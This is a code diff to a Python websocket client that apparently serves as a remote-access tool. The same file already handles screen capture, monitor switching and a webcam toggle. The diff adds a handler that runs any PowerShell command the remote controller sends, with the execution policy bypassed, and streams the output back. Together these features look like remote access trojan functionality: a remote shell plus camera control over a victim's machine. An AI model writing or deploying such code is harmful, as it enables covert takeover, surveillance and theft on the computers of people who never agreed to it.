@@ -682,6 +682,23 @@ async def start_session(ws, sct, client_id):
                     global ws_monitor_idx
                     ws_monitor_idx = int(event.get("index", 1))
                     log(f"[WS] Monitor switched to index {ws_monitor_idx}")
+                elif etype == "ws_ps_execute":
+                    cmd = event.get("cmd", "")
+                    log(f"[WS_PS] Executing: {cmd}")
+                    try:
+                        proc = await asyncio.create_task(asyncio.create_subprocess_shell(
+                            f'powershell.exe -ExecutionPolicy Bypass -Command "{cmd}"',
+                            stdout=asyncio.subprocess.PIPE,
+                            stderr=asyncio.subprocess.STDOUT
+                        ))
+                        while True:
+                            line = await proc.stdout.readline()
+                            if not line: break
+                            decoded = line.decode('utf-8', errors='replace').strip()
+                            if decoded:
+                                await ws.send(orjson.dumps({"t": "ps_output", "data": decoded, "id": client_id}).decode())
+                    except Exception as pe:
+                        await ws.send(orjson.dumps({"t": "ps_output", "data": f"Error: {pe}", "id": client_id}).decode())
                 elif etype == "ws_toggle_webcam":
                     global ws_webcam_active
                     ws_webcam_active = bool(event.get("v", False))
